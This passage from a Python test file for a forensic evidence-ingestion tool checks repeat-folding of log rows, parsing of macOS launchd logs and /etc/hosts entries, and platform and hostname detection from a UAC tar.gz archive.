        {"timestamp": None, "message": "no time"},
    ]
    folded = collapse_repeats(rows)
    assert len(folded) == 5
    assert folded[0]["repeat_count"] == 2 and folded[0]["last_seen"] == "2026-01-01T10:20:00+00:00"
    assert folded[0]["message"].startswith("denied lookup: requestor = app[100] [repeated 2 times")
    assert "repeat_count" not in folded[1] and "repeat_count" not in folded[2]


def test_launchd_log_is_a_macos_log(tmp_path: Path) -> None:
    root = tmp_path / "c"
    _write(root / "uac.log", UAC_LOG)
    log = _write(root / "[root]/private/var/log/com.apple.xpc.launchd/launchd.log", (
        "2026-01-05 10:00:01.000001 (system) <Warning>: denied lookup: name = com.example, requestor = a[11]\n"
        "2026-01-05 10:00:02.000001 (system) <Warning>: denied lookup: name = com.example, requestor = a[12]\n"
        "2026-01-05 10:00:03.000001 (system) <Notice>: service state: running\n"
    ))
    assert looks_like_macos_artifact("[root]/private/var/log/com.apple.xpc.launchd/launchd.log")[1] == "launchd_log"
    rows = parse_macos_artifact_file(log, parser="macos_logs_raw", artifact_type=None, source_path="[root]/private/var/log/com.apple.xpc.launchd/launchd.log")
    assert len(rows) == 2 and rows[0]["repeat_count"] == 2
    assert rows[0]["artifact_family"] == "macos_logs"


def test_etc_hosts_entries_never_become_the_host(tmp_path: Path) -> None:
    from app.ingest.linux.dispatch import parse_linux_artifact_file

    hosts = _write(tmp_path / "etc/hosts", "127.0.0.1 localhost\n10.0.0.9 build-server.internal build\n")
    rows = parse_linux_artifact_file(hosts, parser="linux_network_raw", artifact_type="etc_hosts", source_path="etc/hosts")
    meta = {"artifact_type": "linux_network", "artifact_family": "linux_network", "parser": "linux_network_raw", "source_path": "etc/hosts", "name": "hosts", "detected_host": "real-host"}
    from app.ingest.normalizer import normalize_row

    document = normalize_row("case", "evidence", "artifact", rows[1], meta)
    assert rows[1]["mapped_hostname"] == "build-server.internal" and "hostname" not in rows[1]
    assert document["linux"]["mapped_hostname"] == "build-server.internal"
    assert str(document["host"]["name"]).lower() == "real-host"


def test_preflight_reads_the_uac_header_of_a_tar_gz(uac_root: Path, tmp_path: Path) -> None:
    import tarfile

    from app.services.evidence_preflight import _inspect_archive_or_folder

    archive = tmp_path / "uac-host-macos-20260110080000.tar.gz"
    with tarfile.open(archive, "w:gz") as handle:
        handle.add(uac_root / "uac.log", arcname="uac.log")
        for item in sorted(uac_root.rglob("*")):
            if item.name != "uac.log":
                handle.add(item, arcname=str(item.relative_to(uac_root)), recursive=False)
    work = tmp_path / "preflight-gz"
    work.mkdir()
    result = _inspect_archive_or_folder(archive, declared_platform="auto", tmp_dir=work)
    assert result["platform"] == "macos"
    assert result["hostname"] == "test-mac.local"
